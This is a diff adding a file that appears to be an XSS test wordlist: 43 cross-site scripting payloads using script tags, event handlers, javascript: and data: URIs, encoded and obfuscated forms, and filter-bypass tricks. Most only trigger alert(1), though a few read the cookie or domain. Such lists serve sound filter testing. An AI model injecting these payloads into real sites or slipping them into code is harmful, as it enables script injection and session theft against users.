@@ -1,0 +1,43 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<button onclick=alert(1)>Click</button>
+<marquee onstart=alert(1)>Text</marquee>
+<font color="red" onmouseover="alert(1)">Hover</font>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Csvg%20onload%3Dalert%281%29%3E
+%253Cscript%253Ealert%25281%2529%253C/script%253E
+%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
+<img src=x oneRror=alert(1)>
+<svg><script>alert('Injected!')</script></svg>
+<iframe src="javascript:alert(document.cookie)">
+<details open ontoggle="alert(1)">Details</details>
+<body onload=alert(1)></body>
+<div onmouseover="alert('MouseOver')">Hover</div>
+"><svg/onload=alert(1)>
+'><img src=x onerror=alert(1)>
+<svg><a href="javascript:alert(1)">Click</a></svg>
+<object data="javascript:alert(1)"></object>
+<style>*{xss:expression(alert(1))}</style>
+<div style="background:url(javascript:alert(1))">Test</div>
+<svg style="x:expression(alert(1))">
+"><script>alert(String.fromCharCode(88,83,83))</script>
+%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+`"><img src=x onerror=alert(1)>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+"><sCriPt>alert('XSS')</sCriPt>
+<image src=x onerror=alert(1)>
+<IMG SRC="javascript:alert('XSS');">
+<svg onload="javascript:alert('XSS')"></svg>
+<iframe/onload="javascript:alert('XSS')">
+<base href="javascript:alert('XSS');//">
+"><input onfocus=alert(1) autofocus>
+<iframe src="javascript:%00alert(1)"></iframe>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+"><svg%00onload=alert(1)>
+<img src="x:alert(1)">
+<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<svg><script xlink:href=data:text/javascript;base64,YWxlcnQoMSk=></script></svg>
+<svg/onload='alert("XSS")'></svg>
